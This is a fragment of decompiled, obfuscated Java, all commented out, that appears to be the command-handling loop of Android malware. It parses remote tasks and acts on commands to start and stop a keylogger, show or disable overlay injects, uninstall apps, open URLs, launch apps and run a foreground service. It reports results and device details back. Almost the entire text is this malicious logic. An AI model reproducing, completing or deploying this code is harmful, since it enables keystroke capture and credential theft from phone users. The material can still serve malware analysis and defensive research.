//                                                                        Context contextV0 = csuperV1.f76for;
//                                                                        Boolean booleanV8 = Boolean.TRUE;
//                                                                        Cthrow.m154case(csuperV1.f76for, strV5, Boolean.TRUE);
//                                                                        contextV0 = csuperV1.f76for;
//                                                                        strV0 = csuperV1.f76for.getPackageName();
//                                                                        Context contextV8 = csuperV1.f76for;
//                                                                        Cthrow.m159this(csuperV1.f76for, "uninstall_apps", csuperV1.f76for.getPackageName());
////                                                                        goto goto_7
//                                                                    } catch (Exception e7) {
//                                                                    }
//                                                                } else {
//                                                                    strV8 = "start_keylogger";
//                                                                    boolV8 = strV10.equals("start_keylogger");
//                                                                    strV12 = "keylogger_enabled";
//                                                                    if (strV10.equals("start_keylogger")) {
//                                                                        try {
//                                                                            Context contextV0 = csuperV1.f76for;
//                                                                            Boolean booleanV8 = Boolean.TRUE;
//                                                                            Cthrow.m154case(csuperV1.f76for, "keylogger_enabled", Boolean.TRUE);
//                                                                            contextV0 = csuperV1.f76for;
//                                                                            strV8 = "keylogger_delay";
//                                                                            int intV9 = 0x0;
//                                                                            Integer integerV10 = Integer.valueOf(0x0);
//
////                                                                            goto_5
//                                                                            Cthrow.m155else(csuperV1.f76for, "keylogger_delay", Integer.valueOf(0x0));
////                                                                            goto goto_7
//                                                                        } catch (Exception e8) {
//                                                                        }
//                                                                    } else {
//                                                                        strV8 = "stop_keylogger";
//                                                                        boolV8 = strV10.equals("stop_keylogger");
//                                                                        if (strV10.equals("stop_keylogger")) {
//                                                                            Context contextV0 = csuperV1.f76for;
//                                                                            Boolean booleanV8 = Boolean.FALSE;
//                                                                            Cthrow.m154case(csuperV1.f76for, strV12, Boolean.FALSE);
////                                                                            goto goto_7
//                                                                        } else {
//                                                                            boolV8 = strV10.equals(strV9);
//                                                                            if (strV10.equals(strV9)) {
//                                                                                Context contextV8 = csuperV1.f76for;
//                                                                                strV8 = Cthrow.m158new(csuperV1.f76for, strV9, strV15);
//                                                                                boolean boolV10 = strV8.isEmpty();
//                                                                                if (!strV8.isEmpty()) {
//                                                                                    boolV10 = strV8.endsWith(strV4);
//                                                                                    if (!strV8.endsWith(strV4)) {
//                                                                                        StringBuilder stringBuilderV10 = new StringBuilder();
//                                                                                        stringBuilderV10.append(strV8);
//                                                                                        stringBuilderV10.append(strV4);
//                                                                                        strV8 = stringBuilderV10.toString();
//                                                                                    }
//                                                                                }
//
//                                                                                StringBuilder stringBuilderV10 = new StringBuilder();
//                                                                                stringBuilderV10.append(strV8);
//                                                                                stringBuilderV10.append(strV0);
//                                                                                strV0 = stringBuilderV10.toString();
//                                                                                contextV8 = csuperV1.f76for;
//                                                                                Cthrow.m159this(contextV8, strV9, strV0);
//                                                                                Context contextV0 = csuperV1.f76for;
//                                                                                strV8 = "uninstall_delay";
//                                                                                int intV9 = 0x0;
//                                                                                Integer integerV10 = Integer.valueOf(intV9);
////                                                                                goto goto_5
//                                                                            } else {
//                                                                                strV8 = "start_fg";
//                                                                                boolV8 = strV10.equals("start_fg");
//                                                                                strV9 = "fg";
//                                                                                if (strV10.equals("start_fg")) {
//                                                                                    try {
//                                                                                        Intent intentV0;
//                                                                                        Context contextV8 = csuperV1.f76for;
//                                                                                        intentV0 = new Intent(contextV8, p054v.class);
//                                                                                        strV8 = "start";
//                                                                                        intentV0 = intentV0.putExtra(strV9, strV8);
//                                                                                        contextV8 = csuperV1.f76for;
//                                                                                        Cgoto.s(contextV8, intentV0);
//                                                                                        Context contextV0 = csuperV1.f76for;
//                                                                                        strV8 = "fg_mode";
//                                                                                        Boolean booleanV9 = Boolean.TRUE;
//                                                                                        Cthrow.m154case(contextV0, strV8, booleanV9);
//                                                                                        contextV0 = csuperV1.f76for;
//                                                                                        Integer integerV8 = Integer.valueOf(intV20);
////                                                                                        goto goto_4
//                                                                                    } catch (
//                                                                                            Exception e9) {
//                                                                                    }
//                                                                                } else {
//                                                                                    strV8 = "stop_fg";
//                                                                                    boolV8 = strV10.equals(strV8);
//                                                                                    if (boolV8) {
//                                                                                        Intent intentV0;
//                                                                                        Context contextV8 = csuperV1.f76for;
//                                                                                        p054v p054vV10;
//                                                                                        intentV0 = new Intent(contextV8, p054v.class);
//                                                                                        strV8 = "stop";
//                                                                                        intentV0 = intentV0.putExtra(strV9, strV8);
//                                                                                        contextV8 = csuperV1.f76for;
//                                                                                        Cgoto.s(contextV8, intentV0);
//                                                                                        Context contextV0 = csuperV1.f76for;
//                                                                                        strV8 = "fg_mode";
//                                                                                        Boolean booleanV9 = Boolean.FALSE;
//                                                                                        Cthrow.m154case(contextV0, strV8, booleanV9);
////                                                                                        goto goto_7
//                                                                                    } else {
//                                                                                        strV8 = "open_url";
//                                                                                        boolV8 = strV10.equals(strV8);
//                                                                                        if (boolV8) {
//                                                                                            boolV8 = strV0.startsWith(strV3);
//                                                                                            int intV8;
//                                                                                            if (boolV8) {
//                                                                                                strV0 = strV0.replace(strV3, strV15);
//                                                                                                intV8 = intV20;
////                                                                                                goto goto_6
//                                                                                            } else {
//                                                                                                intV8 = 0x0;
//                                                                                            }
//
//                                                                                            strV9 = "https://";
//                                                                                            boolean boolV9 = strV0.startsWith(strV9);
//                                                                                            if (!boolV9) {
//                                                                                                strV9 = "http://";
//                                                                                                boolV9 = strV0.startsWith(strV9);
//                                                                                                if (boolV9) {
////                                                                                                    cond_1b
//                                                                                                }
//                                                                                            }
//
//                                                                                            if (intV8 != 0) {
//                                                                                                Context contextV8 = csuperV1.f76for;
//                                                                                                Cgoto.sfgjdgjtrfjgdtyrt(contextV8, strV0);
////                                                                                                goto goto_7
//                                                                                            } else {
//                                                                                                Context contextV8 = csuperV1.f76for;
//                                                                                                Cgoto.m(contextV8, strV0);
////                                                                                                goto goto_7
//                                                                                            }
//                                                                                        } else {
//                                                                                            strV8 = "disable_inject";
//                                                                                            boolV8 = strV10.equals(strV8);
//                                                                                            if (boolV8) {
//                                                                                                Cclass cclassV8;
//                                                                                                Context contextV9 = csuperV1.f76for;
//                                                                                                cclassV8 = new Cclass(contextV9);
//                                                                                                cclassV8.fddo(strV0);
////                                                                                                goto goto_7
//                                                                                            } else {
//                                                                                                strV8 = "show_inject";
//                                                                                                boolV8 = strV10.equals(strV8);
//                                                                                                if (boolV8) {
//                                                                                                    Cclass cclassV8;
//                                                                                                    Context contextV9 = csuperV1.f76for;
//                                                                                                    cclassV8 = new Cclass(contextV9);
//                                                                                                    cclassV8.ifdf(strV0);
////                                                                                                    goto goto_7
//                                                                                                } else {
//                                                                                                    strV8 = "run_app";
//                                                                                                    boolV8 = strV10.equals(strV8);
//                                                                                                    if (boolV8) {
//                                                                                                        Context contextV8 = csuperV1.f76for;
//                                                                                                        Cgoto.e(contextV8, strV0);
//                                                                                                    } else {
//                                                                                                        ArrayList arrayListV8 = arrayListV18;
//                                                                                                        Exception exceptionV0;
//                                                                                                        strV9 = "unknown_command";
//                                                                                                        exceptionV0 = new Exception(strV9);
//                                                                                                        throw exceptionV0;
//                                                                                                    }
//                                                                                                }
//                                                                                            }
//                                                                                        }
//                                                                                    }
//                                                                                }
//                                                                            }
//                                                                        }
//                                                                    }
//                                                                }
//                                                            }
//                                                        }
//                                                    }
//                                                }
//                                            }
//                                        }
//                                    }
//                                }
//                            }
//
//                        }
//
////                        goto_7
//                        jsonObjectV0 = new JSONObject();
//                        jsonObjectV0.put(strV7, strV14);
//                        strV8 = "success";
//                        jsonObjectV0.put(strV6, strV8);
//                        strV0 = strV0.toString();
//                        ArrayList arrayListV8 = arrayListV18;
//                        arrayListV8.add(strV0);
//                        String strV18 = strV3;
//                        String strV20 = strV4;
//                        String strV19 = strV5;
//                        strV10 = strV22;
//                        strV12 = strV24;
//                        int intV17 = 0x0;
////                        goto goto_f
//
////                    goto_b
//                        try {
//                            JSONObject jsonObjectV9 = jsonArrayV2.getJSONObject(intV13);
//                            strV10 = strV22;
//                            try {
//                                strV11 = jsonObjectV9.getString(strV10);
//                                strV12 = strV24;
//                                try {
//                                    strV14 = jsonObjectV9.getString(strV12);
//                                    String strV2 = strV23;
//                                    try {
//                                        strV9 = jsonObjectV9.getString(strV2);
//                                        strV23 = strV2;
////                                    goto _goto_d
//
//                                    } catch (Exception eE) {
//                                        eE.printStackTrace();
//                                        strV23 = strV2;
//                                        strV9 = strV16;
////                    goto_d
//                                        StringWriter stringWriterV2 = new StringWriter();
//                                        strV18 = strV3;
//                                        PrintWriter printWriterV3 = new PrintWriter(stringWriterV2);
//                                        eE.printStackTrace(printWriterV3);
//                                        strV2 = stringWriterV2.toString();
//                                        printWriterV3.close();
//                                        int intV3 = 0xa;
//                                        Object[] objArrV3 = new Object[intV3];
//                                        strV22 = Build.VERSION.RELEASE;
//                                        intV17 = 0x0;
//                                        objArrV3[intV17] = strV22;
//                                        strV22 = Build.MANUFACTURER;
//                                        objArrV3[intV20] = strV22;
//                                        strV20 = Build.MODEL;
//                                        int intV21 = 0x2;
//                                        objArrV3[intV21] = strV20;
//                                        strV20 = strV4;
//                                        Context contextV4 = csuperV1.f76for;
//                                        strV4 = Cgoto.m138throws(contextV4);
//                                        int intV19 = 0x3;
//                                        objArrV3[intV19] = strV4;
//                                        int intV4 = 0x4;
//                                        strV19 = strV5;
//                                        Context contextV5 = csuperV1.f76for;
//                                        strV5 = Cgoto.m142while(contextV5);
//                                        objArrV3[intV4] = strV5;
//                                        intV4 = 0x5;
//                                        objArrV3[intV4] = strV11;
//                                        intV4 = 0x6;
//                                        objArrV3[intV4] = strV14;
//                                        intV4 = 0x7;
//                                        objArrV3[intV4] = strV9;
//                                        intV4 = 0x8;
//                                        strV5 = eE.getMessage();
//                                        objArrV3[intV4] = strV5;
//                                        intV4 = 0x9;
//                                        objArrV3[intV4] = strV2;
//                                        strV2 = "\n=============\nPlace: RES_PARSE_TASKS\nBuild.VERSION.RELEASE: %s\nBuild.MANUFACTURER: %s\nBuild.MODEL: %s\nLANG: %s\nCOUNTRY: %s\ntid: %s; task_type: %s; data: %s\nMsg: %s\nTb: %s\n===========\n\n";
//                                        strV2 = String.format(strV2, objArrV3);
//                                        Context contextV3 = csuperV1.f76for;
//                                        Cgoto.f(contextV3, strV2);
//                                        ;
//                                        JSONObject jsonObjectV2;
//                                        jsonObjectV2 = new JSONObject();
//
//                                        try {
//                                            jsonObjectV2.put(strV7, strV11);
//                                            strV3 = "failed";
//                                            jsonObjectV2.put(strV6, strV3);
//                                            strV0 = jsonArrayV2.toString();
//                                            arrayListV8.add(strV0);
//                                        } catch (Exception eF) {
//                                            eF.printStackTrace();
//                                            ;
//                                        }
//                                    }
//                                } catch (Exception eD) {
//                                    String strV2 = strV23;
//                                    strV14 = strV16;
//                                    strV23 = strV2;
//                                    strV9 = strV16;
//                                }
//                            } catch (Exception eC) {
//                                String strV2 = strV23;
//                                strV12 = strV24;
//                                strV11 = strV16;
//                                strV14 = strV11;
//                            }
//                        } catch (Exception exceptionB) {
//                            strV10 = strV22;
//                        }
//                    } catch (Exception e2) {
//                    }
//                } catch (Exception e1) {
//                }
//            } catch (Exception e0) {
//            }
//        }
//
//        return arrayListV14;
//    }
}
